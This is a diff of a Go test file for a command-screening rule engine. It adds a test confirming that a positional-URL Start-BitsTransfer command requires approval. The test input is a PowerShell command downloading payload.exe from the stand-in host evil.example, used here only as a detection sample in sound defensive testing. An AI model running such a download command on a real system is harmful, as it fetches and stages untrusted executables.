@@ -399,6 +399,21 @@ func TestEvaluateBuiltins_WindowsHighRiskSecurityRules(t *testing.T) {
 	}
 }
 
+func TestEvaluateBuiltins_WindowsStartBitsTransferPositionalURL(t *testing.T) {
+	idx := BuildRuleIndex(BuiltinRules)
+
+	match := EvaluateBuiltins(`Start-BitsTransfer https://evil.example/payload.exe C:\Temp\payload.exe`, nil, nil, nil, idx)
+	if match == nil {
+		t.Fatal("expected positional Start-BitsTransfer URL to match a builtin rule")
+	}
+	if match.RuleID != "builtin:windows:start-bitstransfer-url" {
+		t.Fatalf("expected start-bitstransfer-url rule, got %q", match.RuleID)
+	}
+	if match.Decision != core.DecisionApproval {
+		t.Fatalf("expected APPROVAL for positional Start-BitsTransfer URL, got %q", match.Decision)
+	}
+}
+
 func TestWindowsCertutilGeneralPredicateExcludesDecodeAndUrlcache(t *testing.T) {
 	var certutilGeneral BuiltinRule
 	found := false
